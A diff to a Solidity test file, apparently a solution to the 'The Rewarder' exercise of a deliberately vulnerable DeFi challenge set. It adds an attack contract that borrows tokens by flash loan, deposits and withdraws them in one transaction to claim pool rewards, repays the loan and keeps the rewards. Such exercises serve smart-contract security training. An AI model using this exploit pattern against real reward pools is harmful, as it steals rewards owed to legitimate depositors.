@@ -9,7 +9,37 @@ import {TheRewarderPool} from "../../../src/Contracts/the-rewarder/TheRewarderPo
 import {RewardToken} from "../../../src/Contracts/the-rewarder/RewardToken.sol";
 import {AccountingToken} from "../../../src/Contracts/the-rewarder/AccountingToken.sol";
 import {FlashLoanerPool} from "../../../src/Contracts/the-rewarder/FlashLoanerPool.sol";
-import {AttackRewardPool} from "../../../src/Contracts/the-rewarder/FlashLoanerPool.sol";
+import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";
+
+contract AttackRewardPool {
+    address owner;
+    IERC20 liquidityToken;
+    IERC20 rewardToken;
+    FlashLoanerPool pool;
+    TheRewarderPool rewardPool;
+
+    constructor(address _lendingPool, address _rewardPool) {
+        owner = msg.sender;
+        pool = FlashLoanerPool(_lendingPool);
+        rewardPool = TheRewarderPool(_rewardPool);
+        liquidityToken = IERC20(rewardPool.liquidityToken());
+        rewardToken = IERC20(rewardPool.rewardToken());
+    }
+
+    function attack(uint256 _amount) external {
+        pool.flashLoan(_amount);
+    }
+
+    function receiveFlashLoan(uint256 _amount) external payable {
+        liquidityToken.approve(address(rewardPool), _amount);
+        rewardPool.deposit(_amount);
+        rewardPool.withdraw(_amount);
+        liquidityToken.transfer(address(pool), _amount);
+        rewardToken.transfer(owner, rewardToken.balanceOf(address(this)));
+    }
+
+    receive() external payable {}
+}
 
 contract TheRewarder is Test {
     uint256 internal constant TOKENS_IN_LENDER_POOL = 1_000_000e18;
